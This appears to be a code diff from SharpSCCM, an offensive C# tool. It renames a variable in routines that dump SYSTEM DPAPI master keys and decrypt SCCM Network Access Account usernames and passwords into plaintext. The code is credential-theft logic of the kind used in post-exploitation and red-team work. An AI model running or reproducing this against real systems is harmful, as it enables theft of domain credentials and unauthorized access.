@@ -40,10 +40,10 @@ namespace SharpSCCM
                 if (Helpers.IsHighIntegrity())
                 {
 
-                    Dictionary<string, string> mappings = Dpapi.TriageSystemMasterKeys();
+                    Dictionary<string, string> masterkeys = Dpapi.TriageSystemMasterKeys();
 
                     Console.WriteLine("\r\n[*] SYSTEM master key cache:\r\n");
-                    foreach (KeyValuePair<string, string> kvp in mappings)
+                    foreach (KeyValuePair<string, string> kvp in masterkeys)
                     {
                         Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
                     }
@@ -58,7 +58,7 @@ namespace SharpSCCM
                                 string naaPlaintext = "";
                                 Console.WriteLine(
                                     "\r\n[*] Triaging SCCM Network Access Account Credentials from CIM Repository\r\n");
-                                naaPlaintext = Dpapi.Execute(matchesData[index].Groups[idxGroup].Value, mappings);
+                                naaPlaintext = Dpapi.Execute(matchesData[index].Groups[idxGroup].Value, masterkeys);
                                 Console.WriteLine("     Plaintext NAA   : {0}", naaPlaintext);
                                 Console.WriteLine();
                             }
@@ -102,10 +102,10 @@ namespace SharpSCCM
                         Array.Resize(ref protectedUsernameBytes, length);
 
 
-                        Dictionary<string, string> mappings = Dpapi.TriageSystemMasterKeys();
+                        Dictionary<string, string> masterkeys = Dpapi.TriageSystemMasterKeys();
 
                         Console.WriteLine("\r\n[*] SYSTEM master key cache:\r\n");
-                        foreach (KeyValuePair<string, string> kvp in mappings)
+                        foreach (KeyValuePair<string, string> kvp in masterkeys)
                         {
                             Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
                         }
@@ -113,8 +113,8 @@ namespace SharpSCCM
 
                         try
                         {
-                            string username = Dpapi.Execute(protectedUsername, mappings);
-                            string password = Dpapi.Execute(protectedPassword, mappings);
+                            string username = Dpapi.Execute(protectedUsername, masterkeys);
+                            string password = Dpapi.Execute(protectedPassword, masterkeys);
 
                             if (username.StartsWith("00 00 0E 0E 0E") || password.StartsWith("00 00 0E 0E 0E"))
                             {
